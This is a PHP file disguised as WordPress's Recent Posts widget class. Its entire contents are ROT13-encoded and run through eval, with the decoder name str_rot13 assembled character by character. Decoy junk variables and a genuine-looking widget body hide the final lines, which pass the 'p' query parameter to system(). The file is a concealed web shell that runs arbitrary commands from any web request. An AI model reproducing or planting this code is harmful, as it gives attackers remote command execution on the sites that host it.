<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Erprag_Cbfgf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Erprag Cbfgf jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Erprag_Cbfgf rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Erprag Cbfgf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_erprag_ragevrf',
			'qrfpevcgvba'                 => __( 'Lbhe fvgr&#8217;f zbfg erprag Cbfgf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'erprag-cbfgf', __( 'Erprag Cbfgf' ), $jvqtrg_bcf );
		$guvf->nyg_bcgvba_anzr = 'jvqtrg_erprag_ragevrf';
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Erprag Cbfgf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Erprag Cbfgf jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		vs ( ! vffrg( $netf['jvqtrg_vq'] ) ) {
			$netf['jvqtrg_vq'] = $guvf->vq;
		}

		$qrsnhyg_gvgyr = __( 'Erprag Cbfgf' );
		$gvgyr         = ( ! rzcgl( $vafgnapr['gvgyr'] ) ) ? $vafgnapr['gvgyr'] : $qrsnhyg_gvgyr;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		$ahzore = ( ! rzcgl( $vafgnapr['ahzore'] ) ) ? nofvag( $vafgnapr['ahzore'] ) : 5;
		vs ( ! $ahzore ) {
			$ahzore = 5;
		}
		$fubj_qngr = vffrg( $vafgnapr['fubj_qngr'] ) ? $vafgnapr['fubj_qngr'] : snyfr;

		$e = arj JC_Dhrel(
			/**
			 * Svygref gur nethzragf sbe gur Erprag Cbfgf jvqtrg.
			 *
			 * @fvapr 3.4.0
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @frr JC_Dhrel::trg_cbfgf()
			 *
			 * @cnenz neenl $netf     Na neenl bs nethzragf hfrq gb ergevrir gur erprag cbfgf.
			 * @cnenz neenl $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			nccyl_svygref(
				'jvqtrg_cbfgf_netf',
				neenl(
					'cbfgf_cre_cntr'      => $ahzore,
					'ab_sbhaq_ebjf'       => gehr,
					'cbfg_fgnghf'         => 'choyvfu',
					'vtaber_fgvpxl_cbfgf' => gehr,
				),
				$vafgnapr
			)
		);

		vs ( ! $e->unir_cbfgf() ) {
			erghea;
		}
		?>

		<?cuc rpub $netf['orsber_jvqtrg']; ?>

		<?cuc
		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
		$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

		vs ( 'ugzy5' === $sbezng ) {
			// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
			$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
			$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
			rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
		}
		?>

		<hy>
			<?cuc sbernpu ( $e->cbfgf nf $erprag_cbfg ) : ?>
				<?cuc
				$cbfg_gvgyr   = trg_gur_gvgyr( $erprag_cbfg->VQ );
				$gvgyr        = ( ! rzcgl( $cbfg_gvgyr ) ) ? $cbfg_gvgyr : __( '(ab gvgyr)' );
				$nevn_pheerag = '';

				vs ( trg_dhrevrq_bowrpg_vq() === $erprag_cbfg->VQ ) {
					$nevn_pheerag = ' nevn-pheerag=\"cntr\"';
				}
				?>
				<yv>
					<n uers=\"<?cuc gur_creznyvax( $erprag_cbfg->VQ ); ?>\"<?cuc rpub $nevn_pheerag; ?>><?cuc rpub $gvgyr; ?></n>
					<?cuc vs ( $fubj_qngr ) : ?>
						<fcna pynff=\"cbfg-qngr\"><?cuc rpub trg_gur_qngr( '', $erprag_cbfg->VQ ); ?></fcna>
					<?cuc raqvs; ?>
				</yv>
			<?cuc raqsbernpu; ?>
		</hy>

		<?cuc
		vs ( 'ugzy5' === $sbezng ) {
			rpub '</ani>';
		}

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat gur frggvatf sbe gur pheerag Erprag Cbfgf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr              = $byq_vafgnapr;
		$vafgnapr['gvgyr']     = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		$vafgnapr['ahzore']    = (vag) $arj_vafgnapr['ahzore'];
		$vafgnapr['fubj_qngr'] = vffrg( $arj_vafgnapr['fubj_qngr'] ) ? (obby) $arj_vafgnapr['fubj_qngr'] : snyfr;
		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Erprag Cbfgf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$gvgyr     = vffrg( $vafgnapr['gvgyr'] ) ? rfp_ngge( $vafgnapr['gvgyr'] ) : '';
		$ahzore    = vffrg( $vafgnapr['ahzore'] ) ? nofvag( $vafgnapr['ahzore'] ) : 5;
		$fubj_qngr = vffrg( $vafgnapr['fubj_qngr'] ) ? (obby) $vafgnapr['fubj_qngr'] : snyfr;
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub $gvgyr; ?>\" />
		</c>

		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'ahzore' ); ?>\"><?cuc _r( 'Ahzore bs cbfgf gb fubj:' ); ?></ynory>
			<vachg pynff=\"gval-grkg\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'ahzore' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'ahzore' ); ?>\" glcr=\"ahzore\" fgrc=\"1\" zva=\"1\" inyhr=\"<?cuc rpub $ahzore; ?>\" fvmr=\"3\" />
		</c>

		<c>
			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $fubj_qngr ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'fubj_qngr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'fubj_qngr' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'fubj_qngr' ); ?>\"><?cuc _r( 'Qvfcynl cbfg qngr?' ); ?></ynory>
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>